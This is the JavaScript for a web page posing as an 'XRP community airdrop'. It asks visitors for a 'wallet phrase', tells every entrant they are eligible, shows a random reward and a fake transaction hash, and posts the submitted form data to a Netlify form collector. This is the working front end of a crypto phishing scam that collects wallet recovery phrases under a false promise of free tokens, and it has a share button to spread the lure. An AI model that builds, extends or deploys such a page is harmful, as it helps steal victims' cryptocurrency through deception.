//  XRP Airdrop — Vanilla JavaScript
//  Beginner-friendly: simple functions, arrays, if/else
// ====================================================

// Grab the three cards from the HTML
var card1 = document.getElementById("card1"); // Enter wallet address
var card2 = document.getElementById("card2"); // Eligibility result
var card3 = document.getElementById("card3"); // Claim successful

// Grab the step indicator dots
var dot1  = document.getElementById("dot1");
var dot2  = document.getElementById("dot2");
var dot3  = document.getElementById("dot3");
var line1 = document.getElementById("line1");
var line2 = document.getElementById("line2");

// Grab the buttons
var submitAddressBtn = document.getElementById("submitAddressBtn");
var claimBtn         = document.getElementById("claimBtn");
var shareBtn         = document.getElementById("shareBtn");
var navWalletBtn     = document.getElementById("navWalletBtn");

// Grab the input field and error message
var walletInput = document.getElementById("walletInput");
var inputError  = document.getElementById("inputError");

// Text elements we update
var walletAddress  = document.getElementById("walletAddress");
var rewardAmount   = document.getElementById("rewardAmount");
var claimedAmount  = document.getElementById("claimedAmount");
var txHash         = document.getElementById("txHash");

// Stats
var totalDistributed = document.getElementById("totalDistributed");
var totalClaimers    = document.getElementById("totalClaimers");
var spotsLeft        = document.getElementById("spotsLeft");

// Keep track of the connected wallet address
var currentAddress = "";

// A few sample reward amounts (picked randomly to feel real)
var rewards = ["150 XRP", "200 XRP", "250 XRP", "300 XRP", "450 XRP"];

// ---- Helper: shorten a long address for display ----
function shortenAddress(addr) {
  if (addr.length <= 12) return addr;
  return addr.slice(0, 8) + "…" + addr.slice(-6);
}

// ---- Helper: generate a fake transaction hash ----
function makeTxHash() {
  var chars = "0123456789abcdef";
  var hash = "";
  for (var i = 0; i < 40; i++) {
    hash += chars[Math.floor(Math.random() * chars.length)];
  }
  return hash;
}

// ---- Helper: pick a random reward from the list ----
function pickReward() {
  var index = Math.floor(Math.random() * rewards.length);
  return rewards[index];
}

// ---- Helper: show one card and hide the other two ----
function showCard(card) {
  card1.classList.add("hidden");
  card2.classList.add("hidden");
  card3.classList.add("hidden");
  card.classList.remove("hidden");
}

// ---- Helper: update the step indicator ----
function updateSteps(step) {
  dot1.classList.remove("active");
  dot2.classList.remove("active");
  dot3.classList.remove("active");
  line1.classList.remove("active");
  line2.classList.remove("active");

  if (step >= 1) dot1.classList.add("active");
  if (step >= 2) {
    line1.classList.add("active");
    dot2.classList.add("active");
  }
  if (step >= 3) {
    line2.classList.add("active");
    dot3.classList.add("active");
  }
}

// ---- Step 1: Submit wallet address ----
function submitAddress() {
  var addr = walletInput.value.trim();

  if (addr.length < 10) {
    inputError.textContent = "Please enter a valid wallet phrase.";
    inputError.classList.remove("hidden");
    return;
  }

  inputError.classList.add("hidden");
  currentAddress = addr;

  walletAddress.textContent = "You Are Eligible for The Airdrop!"
  navWalletBtn.textContent = "Disconnect";
  navWalletBtn.classList.remove("hidden");

  var reward = pickReward();
  rewardAmount.textContent = reward;
  claimedAmount.textContent = reward;

  showCard(card2);
  updateSteps(2);
}

// ---- Step 2: Claim Airdrop ----
function claimAirdrop() {
  claimBtn.disabled = true;
  claimBtn.textContent = "Processing…";

  setTimeout(function () {
    txHash.textContent = "0x" + makeTxHash();
    showCard(card3);
    updateSteps(3);
    updateStats();
    claimBtn.disabled = false;
    claimBtn.textContent = "Claim Airdrop";
  }, 1800);
}

// ---- Update the stats numbers after a claim ----
function updateStats() {
  var distributed = parseInt(totalDistributed.textContent.replace(/,/g, ""), 10);
  var claimers     = parseInt(totalClaimers.textContent.replace(/,/g, ""), 10);
  var spots        = parseInt(spotsLeft.textContent.replace(/,/g, ""), 10);

  var rewardNum = parseInt(rewardAmount.textContent.replace(/[^0-9]/g, ""), 10);

  distributed += rewardNum;
  claimers    += 1;
  spots       -= 1;

  totalDistributed.textContent = formatNumber(distributed);
  totalClaimers.textContent    = formatNumber(claimers);
  spotsLeft.textContent         = formatNumber(spots);
}

// ---- Helper: add commas to a number ----
function formatNumber(num) {
  return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

// ---- Disconnect Wallet (go back to card 1) ----
function disconnectWallet() {
  currentAddress = "";
  walletInput.value = "";
  navWalletBtn.classList.add("hidden");
  showCard(card1);
  updateSteps(1);
}

// ---- Share on X ----
function shareOnX() {
  var text = "I just claimed free XRP from the community airdrop! 🚀 #XRP #Airdrop";
  var url = "https://twitter.com/intent/tweet?text=" + encodeURIComponent(text);
  window.open(url, "_blank");
}

// ---- FAQ accordion ----
var faqButtons = document.querySelectorAll(".faq-question");

faqButtons.forEach(function (btn) {
  btn.addEventListener("click", function () {
    var index = btn.getAttribute("data-faq");
    var answer = document.getElementById("faq" + index);
    var item = btn.parentElement;

    if (item.classList.contains("open")) {
      item.classList.remove("open");
      answer.style.maxHeight = null;
    } else {
      item.classList.add("open");
      answer.style.maxHeight = answer.scrollHeight + "px";
    }
  });
});

// ---- Event Listeners ----
submitAddressBtn.addEventListener("click", submitAddress);
claimBtn.addEventListener("click", claimAirdrop);
shareBtn.addEventListener("click", shareOnX);
navWalletBtn.addEventListener("click", disconnectWallet);

// Allow pressing Enter in the wallet address input
walletInput.addEventListener("keydown", function (e) {
  if (e.key === "Enter") {
    submitAddress();
  }
});


const productInput = document.getElementById("product");
const productOptions = document.getElementById("productOptions");
const options = productOptions.querySelectorAll("div");


/* Show dropdown when input is clicked */
productInput.addEventListener("focus", () => {
    productOptions.style.display = "block";
});


/* Search wallets */
productInput.addEventListener("input", () => {
    const search = productInput.value.toLowerCase().trim();

    options.forEach(option => {

        const walletName = option.textContent.trim().toLowerCase();

        if (walletName.includes(search)) {
            option.style.display = "block";
        } else {
            option.style.display = "none";
        }

    });

    productOptions.style.display = "block";
});


/* Select wallet */
options.forEach(option => {

    option.addEventListener("click", () => {

        /* Get the wallet name from the existing HTML */
        const walletName = option.textContent.trim();

        /* Get the image that is already inside that option */
        const walletImage = option.querySelector("img");

        /* Put wallet name into input */
        productInput.value = walletName;

        /* Put the same image inside the input */
        if (walletImage) {

            productInput.style.backgroundImage =
                `url("${walletImage.src}")`;

            productInput.style.backgroundRepeat = "no-repeat";
            productInput.style.backgroundPosition = "10px center";
            productInput.style.backgroundSize = "25px 25px";

            productInput.style.paddingLeft = "45px";
        }

        /* Close dropdown */
        productOptions.style.display = "none";

    });

});


/* Close dropdown when clicking outside */
document.addEventListener("click", (event) => {

    if (!event.target.closest(".product-dropdown")) {
        productOptions.style.display = "none";
    }

});


// const form = document.getElementById("myForm");
// const successMessage = document.getElementById("successMessage");
// const submitBtn = document.getElementById("submitAddressBtn");

// form.addEventListener("submit", async function (event) {
//     // Stop Netlify's normal redirect
//     event.preventDefault();

//     // Prevent double-click submissions
//     submitBtn.disabled = true;
//     // submitBtn.textContent = "Submitting...";

//         try {

//         const formData = new FormData(form);

//         // Convert FormData to URL-encoded string (Netlify-friendly for AJAX)
//         const urlEncodedData = new URLSearchParams();
//         for (const pair of formData.entries()) {
//           urlEncodedData.append(pair[0], pair[1]);
//         }

//         // Send the form to Netlify without triggering a redirect
//         const response = await fetch("/", {
//           method: "POST",
//           headers: { "Content-Type": "application/x-www-form-urlencoded" },
//           body: urlEncodedData.toString()
//         });
//   if (!response.ok) {
//             throw new Error("Form submission failed");
//         }

//         // Form successfully received by Netlify — show on-page success UI
//         if (successMessage) {
//           successMessage.style.display = "block";
//           // hide after a short delay
//           setTimeout(() => {
//             successMessage.style.display = "none";
//           }, 4000);
//         }

//         // Reset the form
//         form.reset();

//         // Restore button
//         submitBtn.disabled = false;
//         // submitBtn.textContent = "Submit";

//     } catch (error) {

//         console.error("Netlify form error:", error);

//         alert("Sorry, your form could not be submitted. Please try again.");

//         submitBtn.disabled = false;
//         // submitBtn.textContent = "Submit";
//     }

// });


const form =
document.getElementById("myForm");

form.addEventListener("submit", async function (event) {
    event.preventDefault();

    const formData = new FormData(form);

    try{
      const response = await
    fetch("/", {
        method: "POST",
        headers: {
            "Content-Type":
    "application/x-www-form-urlencoded"
        },
        body: new
    URLSearchParams(formData).toString()
    });

    if (!response.ok) {
        throw new Error("Form Submission Failed")
    }

    // Netlify accepted the submission
             // Form successfully received by Netlify — show on-page success UI
         if (successMessage) {
           successMessage.style.display = "block";
            // hide after a short delay
           setTimeout(() => {
             successMessage.style.display = "none";
           }, 1000);
         }

         // Reset the form
         form.reset();

         // Restore button
         submitBtn.disabled = false;
          submitBtn.textContent = "Submit";
 
     } catch (error) {

         console.error("Netlify form error:", error);

         submitBtn.disabled = false;
         // submitBtn.textContent = "Submit";
     }
  });